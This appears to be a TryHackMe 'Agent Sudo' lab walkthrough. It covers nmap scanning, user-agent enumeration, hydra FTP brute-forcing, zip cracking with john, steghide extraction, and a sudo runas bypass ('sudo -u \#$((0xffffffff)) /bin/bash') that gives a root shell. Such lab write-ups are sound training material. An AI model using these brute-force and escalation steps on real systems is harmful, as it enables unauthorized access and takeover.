*** First of we start with nmap as always

#initial scan...
┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo]
└─$ nmap -p- -A 10.201.126.57 --min-rate=1000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 02:54 EDT
Nmap scan report for 10.201.126.57
Host is up (0.30s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/9%OT=21%CT=1%CU=40043%PV=Y%DS=5%DC=T%G=Y%TM=68E75CB
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=10D%TI=Z%TS=A)SEQ(SP=107%GCD=1%ISR=107%TI=Z%II=I%TS=A)
OS:SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SEQ(SP=FF%GCD=2%ISR=103%TI=
OS:Z%CI=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST1
OS:1NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=6
OS:8DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   114.73 ms 10.17.0.1
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.46 seconds
_______________________________________________________________________________________________________________________________________________________
*** Web page

        displays this message :
 Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
___________________________________________________________________________
so we use curl

*** curl

┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo]
└─$ curl -A "R" -l 10.201.126.57
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
___________________________________________________________________________
#seems like there are 25 agents maybe 26 or something ,  might be alphabetical 

We identified : agent R

# you can write a script to automate the next process 

# after lot of enumeration we find : agent C 

┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo]
└─$ curl -A "C" -L 10.201.126.57
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R


Agents idnetified : R , C , chris
______________________________________________________________________________________________________________________________________________________
// As the text suggests that his passowrd is weak let's crush it...

*** hydra

┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.201.126.57 ftp
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-09 03:05:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.201.126.57:21/
[STATUS] 226.00 tries/min, 226 tries in 00:01h, 14344173 to do in 1057:50h, 16 active
[21][ftp] host: 10.201.126.57   login: chris   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-09 03:06:57
now we log into FTP
______________________________________________________________________________________________________________________________________________________
*** Ftp

//logged in successfully                                                                                                                                                                                              >
┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo]
└─$ ftp 10.201.126.57
Connected to 10.201.126.57.
220 (vsFTPd 3.0.3)
Name (10.201.126.57:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
___________________________________________________________________________
/found 3 files
ftp> ls
229 Entering Extended Passive Mode (|||39845|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
___________________________________________________________________________
//downloading them
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||43650|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***********************************************************************************************************************************************************************************************|   217        1.>
226 Transfer complete.
217 bytes received in 00:00 (0.61 KiB/s)
___________________________________________________________________________
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||47399|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***********************************************************************************************************************************************************************************************| 33143       56.>
226 Transfer complete.
33143 bytes received in 00:00 (36.34 KiB/s)
___________________________________________________________________________
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||5835|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***********************************************************************************************************************************************************************************************| 34842       55.>
226 Transfer complete.
34842 bytes received in 00:01 (25.62 KiB/s)
ftp>
ftp> exit
421 Timeout.
# we make a map in mind now that we might need to use steghide and other tools 
___________________________________________________________________________
## Exploring the files

we extract the .png file with binwalk

binwalk -e cutie.png

we find : ┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip
______________________________________________________________________________________________________________________________________________________
# we find that the zip file is password protected so to crack it we use john
//first we convert the file into a format john can understand using zip2joh

┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > forjohn.hash
Created directory: /home/kali/.john
                                                                                                                                                                                                                      >
┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  forjohn.hash
______________________________________________________________________________________________________________________________________________________
//now we crack it :
┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo/_cutie.png.extracted]
└─$ john forjohn.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
<REDACTED>            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE 2/3 (2025-10-09 03:13) 0.5649g/s 25689p/s 25689c/s 25689C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

and we find the password <Redacted>
//now we open the zip file and see a txt file that says :
______________________________________________________________________________________________________________________________________________________
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
___________________________________________________________________________
//After finding out that this is encoded we use cyberchef or AI if you prefer to crack "QXJlYTUx"
  which turns out to be password/parapharase for the other jpg image we downloaded
______________________________________________________________________________________________________________________________________________________
*** Steghide

┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo]
└─$ steghide extract -sf cute-alien.jpg -p <redacted>
wrote extracted data to "message.txt".

//then we get another txt file that is a game changer
______________________________________________________________________________________________________________________________________________________
# inspecting the message

┌──(kali㉿kali)-[~/TryHAckMe/Agent Sudo]
└─$ cat message.txt
Hi james,

Glad you find this message. Your login password is <redacted>

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

//Agents identified : R , C , chris , james
______________________________________________________________________________________________________________________________________________________
*** SSH

#now with the username and password we can SSH into the machine and and get the user flag ( please do it yourself)
______________________________________________________________________________________________________________________________________________________
*** Privilege Escalation

// we found out that james has these permissions:
james@agent-sudo:/usr/bin$ clear
james@agent-sudo:/usr/bin$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
___________________________________________________________________________
//using the CVE that the box intended we follow the steps by identifying the version firts

james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
___________________________________________________________________________
//Then we paste this command
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)

now let me tell you what happens when you get the f's a little wrong :

james@agent-sudo:~$ sudo -u \#$((0xfffff)) /bin/bash
I have no name!@agent-sudo:~$ id
uid=1048575 gid=1000(james) groups=1000(james)
I have no name!@agent-sudo:~$ cd /root
bash: cd: /root: Permission denied
I have no name!@agent-sudo:~$ exit
exit
______________________________________________________________________________________________________________________________________________________
WHATTTTT and seems like we can be /bin /daemon and god know what ( Suck at Privilege Escalation )
#after a lot of debugging and believe me when i say it ,  A lot of debuggine we find 
______________________________________________________________________________________________________________________________________________________
*** At the end you will find the real name of Agent R in root flag and for the picture just reverse image search it ***
_________________________________________________________________________________________________________________________________________________________________________________________________________________________________
